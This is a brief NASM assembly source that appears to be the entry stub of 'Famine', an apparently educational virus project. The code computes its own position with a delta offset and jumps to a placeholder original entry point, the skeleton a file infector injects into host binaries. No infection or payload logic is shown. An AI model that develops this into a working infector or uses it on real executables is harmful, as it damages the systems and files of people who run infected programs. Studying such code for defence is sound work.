BITS 32
default abs

global _start

%define OEP_DELTA     0xDEADBEEF

section .text
_start:
    push edx
    cld

    call .anchor
.anchor:
    pop  ebp
    sub  ebp, (.anchor - _start)

    pop  edx
    db   0xE9
    dd   OEP_DELTA

section .rodata
msg:
    db "Famine version 1.0 (c)oded by <tde-cama>-<knerini>", 0x0a
msg_len equ $ - msg